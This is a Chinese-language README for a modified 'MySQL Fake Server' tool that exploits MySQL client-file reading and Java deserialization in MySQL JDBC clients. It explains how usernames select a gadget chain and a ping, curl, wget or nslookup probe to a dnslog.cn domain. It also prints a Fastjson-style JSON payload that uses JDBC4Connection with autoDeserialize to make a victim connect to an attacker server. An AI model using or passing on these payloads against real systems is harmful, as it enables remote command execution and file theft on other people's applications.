# MySQL Fake Server
修改自项目：https://github.com/fnmsd/MySQL_Fake_Server

## 用途

1. MySQL服务端读取客户端文件漏洞利用
2. MySQL JDBC客户端Java反序列化漏洞利用

## DNSLOG魔改说明

用户名：`d_[反序列化链简称]_[探测方式]_[dnslog的ID]`

反序列化链有：cb1-cb2，cc1-cc10 等都可以

探测方式：

- p：ping
- c：curl
- w：wget
- n：nslookup

在config.json中配置dnslog域名，并给一个ID值，例如ID是q2z1p8

```json
    "dnslog":{
        "q2z1p8":"q2z1p8.dnslog.cn"
    }
```

例如：`d_cb1_p_q2z1p8`，意思是使用CB1链执行ping命令，探测q2z1p8.dnslog.cn域名

效果：

```json
{
    "x": {
        "@type": "com.mysql.jdbc.JDBC4Connection",
        "hostToConnectTo": "xx.xx.xx.xx",
        "portToConnectTo": 3306,
        "info": {
            "user": "d_cc4_p_q2z1p8",
            "password": "ubuntu",
            "useSSL": "false",
            "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
            "autoDeserialize": "true"
        },
        "databaseToConnectTo": "mysql",
        "url": ""
    }
}
```

![image-20221222185551148](./README.assets/image-20221222185551148.png)